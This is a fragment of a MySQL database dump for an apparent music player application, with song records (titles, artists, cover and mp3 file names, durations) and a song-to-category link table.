INSERT INTO `song` VALUES (104, 'Fade', 'Alan Walker', '', '483C844ABD633BE372E508988C418E30_-804765147.jpg', '483C844ABD633BE372E508988C418E30_Alan Walker - Fade.mp3', 0, 0, 0, 262, '2018-08-24 14:50:48', '2018-08-24 14:50:48');
INSERT INTO `song` VALUES (105, 'ISI ', 'Duca', '', 'BA6E2B350B23E9CA005D3725F0743C51_374191514.jpg', 'BA6E2B350B23E9CA005D3725F0743C51_Duca - ISI.mp3', 0, 0, 0, 301, '2018-08-24 14:51:54', '2018-08-24 14:51:54');
INSERT INTO `song` VALUES (106, 'Blumenkranz', 'Cyua', '', '17F218336CE39138C236D0FDFA0B9683_1448617447.jpg', '17F218336CE39138C236D0FDFA0B9683_Cyua - Blumenkranz.mp3', 0, 0, 0, 259, '2018-08-24 14:52:55', '2018-08-24 14:52:55');
INSERT INTO `song` VALUES (107, 'Victory', 'Two Steps From Hell', '', '67F5B2A2B874AFC11D858F592C897C1A_-1704180039.jpg', '67F5B2A2B874AFC11D858F592C897C1A_Two Steps From Hell - Victory.mp3', 0, 0, 0, 320, '2018-08-24 14:54:25', '2018-08-24 14:54:25');
INSERT INTO `song` VALUES (108, 'Stronger ', 'Kelly Clarkson', '', '77BF91D00BA93B56A5AF3C274089E813_-1643880722.jpg', '77BF91D00BA93B56A5AF3C274089E813_Kelly Clarkson - Stronger.mp3', 0, 0, 0, 221, '2018-08-24 14:55:27', '2018-08-24 14:55:27');
INSERT INTO `song` VALUES (109, 'El Dorado', 'Two Steps From Hell', '', 'CF6962B099FC0EDB3EA410A78EDF4778_-1554497447.jpg', 'CF6962B099FC0EDB3EA410A78EDF4778_Two Steps From Hell - El Dorado.mp3', 0, 0, 0, 254, '2018-08-24 14:57:04', '2018-08-24 14:57:04');
INSERT INTO `song` VALUES (110, 'When We Stand Together', 'Nickelback', '', '9D6E6222B196DA7DAC8DE550E67B16D6_-1841340089.jpg', '9D6E6222B196DA7DAC8DE550E67B16D6_Nickelback - When We Stand Together.mp3', 0, 0, 0, 191, '2018-08-24 15:00:37', '2018-08-24 15:00:37');
INSERT INTO `song` VALUES (111, 'Rags To Rings ', 'Mark Petrie', '', '5A8E7A3571A6823B3146855B09E35D00_-376239447.jpg', '5A8E7A3571A6823B3146855B09E35D00_Mark Petrie,Danny McCarthy - Rags To Rings.mp3', 0, 0, 0, 148, '2018-08-24 15:01:30', '2018-08-24 15:01:30');
INSERT INTO `song` VALUES (112, 'Life', 'Tobu', '', 'CDA77AE5DBC7C1386F02B588D926958D_1575691818.jpg', 'CDA77AE5DBC7C1386F02B588D926958D_Tobu - Life.mp3', 0, 0, 0, 204, '2018-08-24 15:03:07', '2018-08-24 15:03:07');
INSERT INTO `song` VALUES (113, 'ビードロ模様', 'やなぎなぎ', '', 'C24F49F988FE61A3133FF1B03FE1094A_-1397730099.jpg', 'C24F49F988FE61A3133FF1B03FE1094A_やなぎなぎ - ビードロ模様.mp3', 0, 0, 0, 292, '2018-08-24 15:05:14', '2018-08-24 15:05:14');
INSERT INTO `song` VALUES (114, 'Horizon ', 'Janji', '', 'A09FC3D12D753A417264C6F34567225D_550405428.jpg', 'A09FC3D12D753A417264C6F34567225D_Janji - Horizon.mp3', 0, 0, 0, 197, '2018-08-24 15:06:10', '2018-08-24 15:06:10');
INSERT INTO `song` VALUES (115, 'only my railgun', '花たん', '', '17DB66B16D04518A72C518CA95A74190_-1216711231.jpg', '17DB66B16D04518A72C518CA95A74190_花たん - only my railgun.mp3', 0, 0, 0, 300, '2018-08-24 15:06:59', '2018-08-24 15:06:59');
INSERT INTO `song` VALUES (116, 'ろりこんでよかった～', 'ちぃむdmp☆', '', '28CA2213D22885A3D4EAFD60CD6B047C_-673025865.jpg', '28CA2213D22885A3D4EAFD60CD6B047C_ちぃむdmp☆ - ろりこんでよかった～.mp3', 0, 0, 0, 208, '2018-08-24 15:08:22', '2018-08-24 15:08:22');
INSERT INTO `song` VALUES (117, '白金ディスコ  ', '井口裕香', '', '562387564F06F2B2EE18337A5AC928FA_-1069275323.jpg', '562387564F06F2B2EE18337A5AC928FA_井口裕香 - 白金ディスコ.mp3', 0, 0, 0, 257, '2018-08-24 15:09:43', '2018-08-24 15:09:43');
INSERT INTO `song` VALUES (118, 'Aphrodite ', 'S.E.N.S', '', '2C4F11783FE23BA4D5C59CA6A7A32CCA_1814043257.jpg', '2C4F11783FE23BA4D5C59CA6A7A32CCA_S.E.N.S. - Aphrodite.mp3', 0, 0, 0, 237, '2018-08-24 15:11:20', '2018-08-24 15:11:20');
INSERT INTO `song` VALUES (119, 'Alice Maestera ', 'Alstroemeria Records', '', '392BB6EC54E98AE755DE0045139B3811_-915638707.jpg', '392BB6EC54E98AE755DE0045139B3811_Alstroemeria Records - Alice Maestera.mp3', 0, 0, 0, 367, '2018-08-24 15:12:04', '2018-08-24 15:12:04');
INSERT INTO `song` VALUES (120, 'Crying in the Rain ', 'Don Williams', '', '4EB559C6EA0E35DDB50AEE74137ABE75_-440874751.jpg', '4EB559C6EA0E35DDB50AEE74137ABE75_Don Williams - Crying in the Rain.mp3', 0, 0, 0, 183, '2018-08-24 15:13:11', '2018-08-24 15:13:11');
INSERT INTO `song` VALUES (121, 'Beauty and a Beat  ', 'Alex Goot', '', '389481AA095289925643C637BD1CF7CF_1866503771.jpg', '389481AA095289925643C637BD1CF7CF_Alex Goot - Beauty and a Beat.mp3', 0, 0, 0, 205, '2018-08-24 15:14:54', '2018-08-24 15:14:54');
INSERT INTO `song` VALUES (122, 'Waves ', 'Axero', '', '6CF79E632572E73F969A5429CCC131F6_-1374049312.jpg', '6CF79E632572E73F969A5429CCC131F6_Axero - Waves.mp3', 0, 0, 0, 266, '2018-08-24 15:16:24', '2018-08-24 15:16:24');
INSERT INTO `song` VALUES (123, 'Breath and Life ', 'Audio Machine', '', '5B95694D4962CF136361B1F1994C94EF_-1746870963.jpg', '5B95694D4962CF136361B1F1994C94EF_Audio Machine - Breath and Life.mp3', 0, 0, 0, 111, '2018-08-24 15:17:16', '2018-08-24 15:17:16');
INSERT INTO `song` VALUES (124, 'The Way', 'Florian Bur', '', '78C9BEC0D9A382A273F669958FAEDFE7_-501333588.jpg', '78C9BEC0D9A382A273F669958FAEDFE7_Florian Bur - The Way.mp3', 0, 0, 0, 135, '2018-08-24 15:18:17', '2018-08-24 15:18:17');
INSERT INTO `song` VALUES (125, 'NEXT TO YOU', 'Ken Arai', '', 'FA3217AFA41D9B27123E8B6386B97449_1926094732.jpg', 'FA3217AFA41D9B27123E8B6386B97449_Ken Arai - NEXT TO YOU.mp3', 0, 0, 0, 225, '2018-08-24 15:19:46', '2018-08-24 15:19:46');
INSERT INTO `song` VALUES (126, 'Sunshine', 'MONKEY MAJIK', '', 'CD2DFEE2085CC8872D86C9CA24E1D6BB_-487994818.jpg', 'CD2DFEE2085CC8872D86C9CA24E1D6BB_MONKEY MAJIK - Sunshine.mp3', 0, 0, 0, 239, '2018-08-24 15:20:22', '2018-08-24 15:20:22');
INSERT INTO `song` VALUES (127, '世界は恋に落ちている -acoustic version', 'かぴ', '', '0BA9D1D68B79FC52DE94F82578DD9A89_1513036843.jpg', '0BA9D1D68B79FC52DE94F82578DD9A89_かぴ - 世界は恋に落ちている -acoustic version-.mp3', 0, 0, 0, 340, '2018-08-24 15:22:18', '2018-08-24 15:22:18');
INSERT INTO `song` VALUES (128, 'Alejandro', 'Vitamin String Quartet', '', '8662A41C0536FD77A19800F4743E6DBA_1446065005.jpg', '8662A41C0536FD77A19800F4743E6DBA_Vitamin String Quartet - Alejandro.mp3', 0, 0, 0, 196, '2018-08-24 15:23:13', '2018-08-24 15:23:13');
INSERT INTO `song` VALUES (129, 'Bad Romance ', 'Vitamin String Quartet', '', '073B518BD9B4378EC93E24A8ECC06907_1446065005.jpg', '073B518BD9B4378EC93E24A8ECC06907_Vitamin String Quartet - Bad Romance.mp3', 0, 0, 0, 250, '2018-08-24 15:24:44', '2018-08-24 15:24:44');
INSERT INTO `song` VALUES (130, '過ぎ去りし夏 ', 'Aleile', '', 'D9EE94CE47108889FB14B7BFE74AA352_823790121.jpg', 'D9EE94CE47108889FB14B7BFE74AA352_Aleile - 過ぎ去りし夏.mp3', 0, 0, 0, 210, '2018-08-24 15:26:38', '2018-08-24 15:26:38');
INSERT INTO `song` VALUES (131, 'Skin', 'Rag\'N\'Bone Man', '', '6EBB9F3C95FC64DFFA669AF76554DA9D_-1592185093.jpg', '6EBB9F3C95FC64DFFA669AF76554DA9D_Rag\'N\'Bone Man - Skin.mp3', 0, 0, 0, 240, '2018-08-24 15:28:17', '2018-08-24 15:28:17');
INSERT INTO `song` VALUES (132, 'Rage Your Dream', 'm.o.v.e', '', '7275BB3AD2C6BAB836628197EB2B42FE_302931260.jpg', '7275BB3AD2C6BAB836628197EB2B42FE_m.o.v.e - Rage Your Dream.mp3', 0, 0, 0, 272, '2018-08-24 15:29:10', '2018-08-24 15:29:10');
INSERT INTO `song` VALUES (133, 'The Cup Of Life (La Copa De La Vida) (Original English Version)', 'Ricky Martin', '', 'CFF43E4F9E9965BAD282AD5EF8B16A28_-1278130561.jpg', 'CFF43E4F9E9965BAD282AD5EF8B16A28_Ricky Martin - The Cup Of Life (La Copa De La Vida) (Original English Version).mp3', 0, 0, 0, 272, '2018-08-24 15:30:30', '2018-08-24 15:30:30');
INSERT INTO `song` VALUES (134, 'Tassel ', 'Cymophane', '', 'F01188A37B00C789F79A047286561FF7_222818790.jpg', 'F01188A37B00C789F79A047286561FF7_Cymophane - Tassel.mp3', 0, 0, 0, 270, '2018-08-24 15:31:17', '2018-08-24 15:31:17');
INSERT INTO `song` VALUES (135, 'again ~アニメ Version~', 'YUI', '', '9AA8FEE75343DC76C0C4129BB0261C34_-1077874238.jpg', '9AA8FEE75343DC76C0C4129BB0261C34_YUI - again ~アニメ Version~.mp3', 0, 0, 0, 100, '2018-08-24 15:32:42', '2018-08-24 15:32:42');
INSERT INTO `song` VALUES (136, 'Rolling In the Deep (Piano/cello Instrumental Cover) - instrumental', 'Jon Schmidt', '', 'B31D5E5B3B6E160AAFDBEE1F9D0BCFA9_-177657249.jpg', 'B31D5E5B3B6E160AAFDBEE1F9D0BCFA9_Jon Schmidt - Rolling In the Deep (Piano／cello Instrumental Cover) - instrumental.mp3', 0, 0, 0, 232, '2018-08-24 15:34:09', '2018-08-24 15:34:09');
INSERT INTO `song` VALUES (137, '緋色月下、狂咲ノ絶　-1st Anniversary Remix-', 'nayuta', '', 'DCF26CCA2BC043940077F957D61994D4_-1642817248.jpg', 'DCF26CCA2BC043940077F957D61994D4_nayuta - 緋色月下、狂咲ノ絶　-1st Anniversary Remix-.mp3', 0, 0, 0, 367, '2018-08-24 15:35:28', '2018-08-24 15:35:28');
INSERT INTO `song` VALUES (138, 'In Love ', 'July', '', '9BF953B54C5B6AC708AF8C06D261C98A_1316121610.jpg', '9BF953B54C5B6AC708AF8C06D261C98A_July - In Love.mp3', 0, 0, 0, 233, '2018-08-24 15:37:05', '2018-08-24 15:37:05');
INSERT INTO `song` VALUES (139, '星の在り処 ', 'う～み', '', '073DCCCE21F60D0F8355605A793A4A7D_617721308.jpg', '073DCCCE21F60D0F8355605A793A4A7D_う～み - 星の在り処.mp3', 0, 0, 0, 284, '2018-08-24 15:38:12', '2018-08-24 15:38:12');
INSERT INTO `song` VALUES (140, '终わりの世界から', 'やなぎなぎ', '', 'F1EBDF4B474B29F16A9F6DCB700B3BD8_-258260523.jpg', 'F1EBDF4B474B29F16A9F6DCB700B3BD8_やなぎなぎ - 终わりの世界から.mp3', 0, 0, 0, 365, '2018-08-24 15:40:16', '2018-08-24 15:40:16');
INSERT INTO `song` VALUES (141, 'Inspire ', 'Capo Productions', '', '6D62F0C8E3620B1538E79F14CD9D8AFE_-968807990.jpg', '6D62F0C8E3620B1538E79F14CD9D8AFE_Capo Productions - Inspire.mp3', 0, 0, 0, 219, '2018-08-24 15:41:12', '2018-08-24 15:41:12');
INSERT INTO `song` VALUES (142, 'Love Paradise ', '陈慧琳', '', '707793341385E8050B3D0F5DCD71BEFF_1663357773.jpg', '707793341385E8050B3D0F5DCD71BEFF_陈慧琳 - Love Paradise.mp3', 0, 0, 0, 196, '2018-08-24 15:42:36', '2018-08-24 15:42:36');
INSERT INTO `song` VALUES (143, 'Waving flag ', 'K\'Naan', '', 'E05ED0C636A421EA7A963962384EBA66_-601311435.jpg', 'E05ED0C636A421EA7A963962384EBA66_K\'Naan,David Guetta,will.i.am - Waving flag.mp3', 0, 0, 0, 221, '2018-08-24 15:43:57', '2018-08-24 15:43:57');
INSERT INTO `song` VALUES (144, 'Endless', 'Natio / CLAW$', '', 'BB39D37FF88221D1D1E9983B4DA7FD95_-1147099645.jpg', 'BB39D37FF88221D1D1E9983B4DA7FD95_Natio,CLAW$ - Endless.mp3', 0, 0, 0, 257, '2018-08-24 15:45:09', '2018-08-24 15:45:09');
INSERT INTO `song` VALUES (145, 'Higher', 'Tobu', '', '82E5E72616C23C242DDDDF4BBF46FCC5_-97227451.jpg', '82E5E72616C23C242DDDDF4BBF46FCC5_Tobu - Higher.mp3', 0, 0, 0, 213, '2018-08-24 15:46:21', '2018-08-24 15:46:21');
INSERT INTO `song` VALUES (146, 'Adventures', 'Alex Skrindo', '', '53EBF0EF63F0E5901F35D28B26AF76C0_-304873486.jpg', '53EBF0EF63F0E5901F35D28B26AF76C0_Alex Skrindo - Adventures.mp3', 0, 0, 0, 219, '2018-08-24 15:47:06', '2018-08-24 15:47:06');
INSERT INTO `song` VALUES (147, 'Journey ', 'Capo Productions', '', 'E935D389797634ADBBAF91CF6AA2A4CB_-968807990.jpg', 'E935D389797634ADBBAF91CF6AA2A4CB_Capo Productions - Journey.mp3', 0, 0, 0, 180, '2018-08-24 15:48:02', '2018-08-24 15:48:02');
INSERT INTO `song` VALUES (148, 'Home', 'Edward Sharpe & The Magnetic Zeros', '', '8F5631104ED06E2145488ECF855F03E1_-2075377198.jpg', '8F5631104ED06E2145488ECF855F03E1_Edward Sharpe & The Magnetic Zeros - Home.mp3', 0, 0, 0, 306, '2018-08-24 17:11:59', '2018-08-24 17:11:59');
INSERT INTO `song` VALUES (149, 'Battles and Wastelands', 'Neo Retros', '', 'DCE2ED7AA9A7BB6EFF92F5957B832D1C_1905306918.jpg', 'DCE2ED7AA9A7BB6EFF92F5957B832D1C_Battles and Wastelands .mp3', 0, 0, 0, 172, '2018-08-24 17:15:22', '2018-08-24 17:15:22');
INSERT INTO `song` VALUES (150, 'As Long as You Love Me  ', 'Backstreet Boys', '', 'AB56C75097B6EEDB3C5F5B809216E97F_1958327885.jpg', 'AB56C75097B6EEDB3C5F5B809216E97F_As Long as You Love Me.mp3', 0, 0, 0, 212, '2018-08-24 17:17:08', '2018-08-24 17:17:08');
INSERT INTO `song` VALUES (151, 'Brave Shine ', 'Aimer', '', '8000C0264664F5B375DD61A16C117FF6_-1098344579.jpg', '8000C0264664F5B375DD61A16C117FF6_Brave Shine.mp3', 0, 0, 0, 234, '2018-08-24 17:19:40', '2018-08-24 17:19:40');
INSERT INTO `song` VALUES (152, 'Immortals', 'Fall Out Boy', '', 'E5E06268DCD0AC3966330068406C19E4_-1714109311.jpg', 'E5E06268DCD0AC3966330068406C19E4_Immortals,End Credit Version.mp3', 0, 0, 0, 193, '2018-08-24 17:21:15', '2018-08-24 17:21:15');
INSERT INTO `song` VALUES (153, 'Counting Stars', 'OneRepublic', '', '0E93399528F2E70369B86D2BBAF44BF0_-1202523201.jpg', '0E93399528F2E70369B86D2BBAF44BF0_Counting Stars.mp3', 0, 0, 0, 257, '2018-08-24 17:22:05', '2018-08-24 17:22:05');
INSERT INTO `song` VALUES (154, 'Love Yourself', 'Justin Bieber', '', '8B041BF32CDCC576DE30CF8C18352F34_1038299475.jpg', '8B041BF32CDCC576DE30CF8C18352F34_Justin Bieber - Love Yourself.mp3', 0, 0, 0, 234, '2018-08-24 17:23:42', '2018-08-24 17:23:42');
INSERT INTO `song` VALUES (156, 'Shape of You', 'Ed Sheeran', '', 'B24A5ACCD32F3D63374BA73BC57BB299_-305636722.jpg', 'B24A5ACCD32F3D63374BA73BC57BB299_Shape of You.mp3', 0, 0, 0, 231, '2018-08-24 17:30:35', '2018-08-24 17:30:35');
INSERT INTO `song` VALUES (157, 'Sun', 'Steerner / Martell', '', '3F05A28AC4F6999A8C79AAAB7E1B2C84_1636890982.jpg', '3F05A28AC4F6999A8C79AAAB7E1B2C84_Sun.mp3', 0, 0, 0, 210, '2018-08-24 17:32:21', '2018-08-24 17:32:21');
INSERT INTO `song` VALUES (158, 'Take My Hand', 'Simple Plan', '', 'F661E1DBD81CD460FA129A78CF475AE2_-1528547069.jpg', 'F661E1DBD81CD460FA129A78CF475AE2_Take My Hand.mp3', 0, 0, 0, 232, '2018-08-24 17:33:56', '2018-08-24 17:33:56');
INSERT INTO `song` VALUES (159, 'The Phoenix', 'Fall Out Boy', '', 'CFC4291905B9D4EE2B27A6480763E3A2_-258658691.jpg', 'CFC4291905B9D4EE2B27A6480763E3A2_The Phoenix.mp3', 0, 0, 0, 245, '2018-08-24 17:35:04', '2018-08-24 17:35:04');
INSERT INTO `song` VALUES (160, 'Viva La Vida', 'Coldplay', '', '60F4FE279989BC9EEDD18A6B4C287E53_-1886768583.jpg', '60F4FE279989BC9EEDD18A6B4C287E53_Viva La Vida.mp3', 0, 0, 0, 241, '2018-08-24 17:36:36', '2018-08-24 17:36:36');
INSERT INTO `song` VALUES (161, 'My Friend', 'SPYAIR', '', '859B7180F2CE00898438AB4B440D473B_-1769494456.jpg', '859B7180F2CE00898438AB4B440D473B_My Friend .mp3', 0, 0, 0, 231, '2018-08-24 17:38:01', '2018-08-24 17:38:01');
INSERT INTO `song` VALUES (162, 'Alice（Cover 古川本舗）', '米白', '', 'F3366EA718B8D4E161C78F0935DB1543_-1028601923.jpg?v=1537797454908', 'F3366EA718B8D4E161C78F0935DB1543_米白 - Alice（Cover 古川本舗）.mp3?v=1537797454913', 0, 0, 0, 237, '2018-09-24 21:57:26', '2018-09-24 21:57:26');
INSERT INTO `song` VALUES (163, 'Melody', 'Capo Productions', '', 'BAAE56C5760D52E870F4FF093B4FA7AA_-1078927957.jpg?v=1547433825117', 'BAAE56C5760D52E870F4FF093B4FA7AA_Capo Productions - Melody.mp3?v=1547433825117', 0, 0, 0, 116, '2019-01-14 10:43:42', '2019-01-14 10:43:42');

-- ----------------------------
-- Table structure for song_bind_song_category
-- ----------------------------
DROP TABLE IF EXISTS `song_bind_song_category`;
CREATE TABLE `song_bind_song_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT,
  `song_id` int(0) NOT NULL,
  `song_category_id` int(0) NOT NULL,
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 427 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of song_bind_song_category
-- ----------------------------
INSERT INTO `song_bind_song_category` VALUES (49, 6, 1, '2018-08-24 11:25:34', '2018-08-24 11:25:34');
INSERT INTO `song_bind_song_category` VALUES (50, 6, 3, '2018-08-24 11:25:34', '2018-08-24 11:25:34');
INSERT INTO `song_bind_song_category` VALUES (51, 7, 7, '2018-08-24 11:28:51', '2018-08-24 11:28:51');
INSERT INTO `song_bind_song_category` VALUES (52, 7, 6, '2018-08-24 11:28:51', '2018-08-24 11:28:51');
INSERT INTO `song_bind_song_category` VALUES (53, 8, 1, '2018-08-24 11:30:43', '2018-08-24 11:30:43');
INSERT INTO `song_bind_song_category` VALUES (54, 8, 8, '2018-08-24 11:30:43', '2018-08-24 11:30:43');
INSERT INTO `song_bind_song_category` VALUES (55, 9, 1, '2018-08-24 11:32:49', '2018-08-24 11:32:49');
INSERT INTO `song_bind_song_category` VALUES (56, 9, 3, '2018-08-24 11:32:49', '2018-08-24 11:32:49');
INSERT INTO `song_bind_song_category` VALUES (57, 12, 8, '2018-08-24 11:35:52', '2018-08-24 11:35:52');
INSERT INTO `song_bind_song_category` VALUES (58, 13, 6, '2018-08-24 11:37:39', '2018-08-24 11:37:39');
INSERT INTO `song_bind_song_category` VALUES (59, 13, 1, '2018-08-24 11:37:39', '2018-08-24 11:37:39');
INSERT INTO `song_bind_song_category` VALUES (62, 15, 1, '2018-08-24 11:40:24', '2018-08-24 11:40:24');
INSERT INTO `song_bind_song_category` VALUES (63, 15, 4, '2018-08-24 11:40:24', '2018-08-24 11:40:24');
INSERT INTO `song_bind_song_category` VALUES (64, 16, 8, '2018-08-24 11:41:53', '2018-08-24 11:41:53');
INSERT INTO `song_bind_song_category` VALUES (66, 18, 1, '2018-08-24 11:46:11', '2018-08-24 11:46:11');
INSERT INTO `song_bind_song_category` VALUES (67, 18, 2, '2018-08-24 11:46:11', '2018-08-24 11:46:11');
INSERT INTO `song_bind_song_category` VALUES (68, 14, 7, '2018-08-24 11:46:52', '2018-08-24 11:46:52');
INSERT INTO `song_bind_song_category` VALUES (69, 17, 7, '2018-08-24 11:48:08', '2018-08-24 11:48:08');
INSERT INTO `song_bind_song_category` VALUES (70, 19, 4, '2018-08-24 11:49:47', '2018-08-24 11:49:47');
INSERT INTO `song_bind_song_category` VALUES (71, 20, 1, '2018-08-24 11:52:47', '2018-08-24 11:52:47');
INSERT INTO `song_bind_song_category` VALUES (72, 20, 2, '2018-08-24 11:52:47', '2018-08-24 11:52:47');
INSERT INTO `song_bind_song_category` VALUES (75, 22, 1, '2018-08-24 11:55:10', '2018-08-24 11:55:10');
INSERT INTO `song_bind_song_category` VALUES (76, 22, 6, '2018-08-24 11:55:10', '2018-08-24 11:55:10');
INSERT INTO `song_bind_song_category` VALUES (77, 23, 1, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song_bind_song_category` VALUES (78, 23, 3, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song_bind_song_category` VALUES (79, 23, 5, '2018-08-24 11:57:04', '2018-08-24 11:57:04');
INSERT INTO `song_bind_song_category` VALUES (83, 21, 1, '2018-08-24 11:57:37', '2018-08-24 11:57:37');
INSERT INTO `song_bind_song_category` VALUES (84, 21, 5, '2018-08-24 11:57:37', '2018-08-24 11:57:37');
INSERT INTO `song_bind_song_category` VALUES (85, 21, 6, '2018-08-24 11:57:37', '2018-08-24 11:57:37');
INSERT INTO `song_bind_song_category` VALUES (86, 24, 4, '2018-08-24 11:59:17', '2018-08-24 11:59:17');
INSERT INTO `song_bind_song_category` VALUES (87, 24, 1, '2018-08-24 11:59:17', '2018-08-24 11:59:17');
INSERT INTO `song_bind_song_category` VALUES (88, 25, 1, '2018-08-24 12:00:18', '2018-08-24 12:00:18');
INSERT INTO `song_bind_song_category` VALUES (89, 25, 3, '2018-08-24 12:00:18', '2018-08-24 12:00:18');
INSERT INTO `song_bind_song_category` VALUES (90, 26, 4, '2018-08-24 12:03:57', '2018-08-24 12:03:57');
INSERT INTO `song_bind_song_category` VALUES (91, 26, 1, '2018-08-24 12:03:57', '2018-08-24 12:03:57');
INSERT INTO `song_bind_song_category` VALUES (92, 27, 1, '2018-08-24 12:05:38', '2018-08-24 12:05:38');
INSERT INTO `song_bind_song_category` VALUES (93, 27, 4, '2018-08-24 12:05:38', '2018-08-24 12:05:38');
INSERT INTO `song_bind_song_category` VALUES (94, 28, 1, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song_bind_song_category` VALUES (95, 28, 6, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song_bind_song_category` VALUES (96, 28, 7, '2018-08-24 12:07:36', '2018-08-24 12:07:36');
INSERT INTO `song_bind_song_category` VALUES (97, 29, 1, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song_bind_song_category` VALUES (98, 29, 4, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song_bind_song_category` VALUES (99, 29, 8, '2018-08-24 12:09:37', '2018-08-24 12:09:37');
INSERT INTO `song_bind_song_category` VALUES (100, 30, 1, '2018-08-24 12:12:12', '2018-08-24 12:12:12');
INSERT INTO `song_bind_song_category` VALUES (101, 30, 2, '2018-08-24 12:12:12', '2018-08-24 12:12:12');
INSERT INTO `song_bind_song_category` VALUES (102, 31, 3, '2018-08-24 12:15:41', '2018-08-24 12:15:41');
INSERT INTO `song_bind_song_category` VALUES (103, 31, 5, '2018-08-24 12:15:41', '2018-08-24 12:15:41');
INSERT INTO `song_bind_song_category` VALUES (104, 32, 1, '2018-08-24 12:17:52', '2018-08-24 12:17:52');
INSERT INTO `song_bind_song_category` VALUES (105, 32, 2, '2018-08-24 12:17:52', '2018-08-24 12:17:52');
INSERT INTO `song_bind_song_category` VALUES (111, 34, 5, '2018-08-24 12:23:11', '2018-08-24 12:23:11');
INSERT INTO `song_bind_song_category` VALUES (112, 34, 3, '2018-08-24 12:23:11', '2018-08-24 12:23:11');
INSERT INTO `song_bind_song_category` VALUES (113, 35, 4, '2018-08-24 12:26:38', '2018-08-24 12:26:38');
INSERT INTO `song_bind_song_category` VALUES (116, 36, 1, '2018-08-24 12:31:16', '2018-08-24 12:31:16');
INSERT INTO `song_bind_song_category` VALUES (117, 36, 4, '2018-08-24 12:31:16', '2018-08-24 12:31:16');
INSERT INTO `song_bind_song_category` VALUES (118, 36, 7, '2018-08-24 12:31:16', '2018-08-24 12:31:16');
INSERT INTO `song_bind_song_category` VALUES (119, 37, 7, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song_bind_song_category` VALUES (120, 37, 3, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song_bind_song_category` VALUES (121, 37, 1, '2018-08-24 12:33:20', '2018-08-24 12:33:20');
INSERT INTO `song_bind_song_category` VALUES (122, 38, 1, '2018-08-24 12:35:09', '2018-08-24 12:35:09');
INSERT INTO `song_bind_song_category` VALUES (123, 38, 2, '2018-08-24 12:35:09', '2018-08-24 12:35:09');
INSERT INTO `song_bind_song_category` VALUES (124, 39, 7, '2018-08-24 12:36:37', '2018-08-24 12:36:37');
INSERT INTO `song_bind_song_category` VALUES (125, 39, 6, '2018-08-24 12:36:37', '2018-08-24 12:36:37');
INSERT INTO `song_bind_song_category` VALUES (126, 33, 3, '2018-08-24 12:37:20', '2018-08-24 12:37:20');
INSERT INTO `song_bind_song_category` VALUES (127, 33, 5, '2018-08-24 12:37:20', '2018-08-24 12:37:20');
INSERT INTO `song_bind_song_category` VALUES (128, 40, 1, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (129, 40, 7, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (130, 40, 6, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (131, 40, 4, '2018-08-24 12:39:49', '2018-08-24 12:39:49');
INSERT INTO `song_bind_song_category` VALUES (132, 41, 7, '2018-08-24 12:41:06', '2018-08-24 12:41:06');
INSERT INTO `song_bind_song_category` VALUES (133, 41, 8, '2018-08-24 12:41:06', '2018-08-24 12:41:06');
INSERT INTO `song_bind_song_category` VALUES (134, 42, 7, '2018-08-24 12:43:00', '2018-08-24 12:43:00');
INSERT INTO `song_bind_song_category` VALUES (135, 43, 1, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song_bind_song_category` VALUES (136, 43, 4, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song_bind_song_category` VALUES (137, 43, 7, '2018-08-24 12:44:37', '2018-08-24 12:44:37');
INSERT INTO `song_bind_song_category` VALUES (138, 44, 7, '2018-08-24 12:46:28', '2018-08-24 12:46:28');
INSERT INTO `song_bind_song_category` VALUES (139, 44, 8, '2018-08-24 12:46:28', '2018-08-24 12:46:28');
INSERT INTO `song_bind_song_category` VALUES (140, 45, 8, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (141, 45, 4, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (142, 45, 1, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (143, 45, 7, '2018-08-24 12:47:50', '2018-08-24 12:47:50');
INSERT INTO `song_bind_song_category` VALUES (144, 46, 8, '2018-08-24 12:50:41', '2018-08-24 12:50:41');
INSERT INTO `song_bind_song_category` VALUES (145, 46, 7, '2018-08-24 12:50:41', '2018-08-24 12:50:41');
INSERT INTO `song_bind_song_category` VALUES (146, 47, 7, '2018-08-24 12:51:57', '2018-08-24 12:51:57');
INSERT INTO `song_bind_song_category` VALUES (147, 47, 4, '2018-08-24 12:51:57', '2018-08-24 12:51:57');
INSERT INTO `song_bind_song_category` VALUES (148, 48, 3, '2018-08-24 12:52:53', '2018-08-24 12:52:53');
INSERT INTO `song_bind_song_category` VALUES (149, 49, 3, '2018-08-24 12:54:49', '2018-08-24 12:54:49');
INSERT INTO `song_bind_song_category` VALUES (150, 49, 5, '2018-08-24 12:54:49', '2018-08-24 12:54:49');
INSERT INTO `song_bind_song_category` VALUES (151, 50, 6, '2018-08-24 12:57:12', '2018-08-24 12:57:12');
INSERT INTO `song_bind_song_category` VALUES (152, 50, 7, '2018-08-24 12:57:12', '2018-08-24 12:57:12');
INSERT INTO `song_bind_song_category` VALUES (153, 51, 2, '2018-08-24 12:58:32', '2018-08-24 12:58:32');
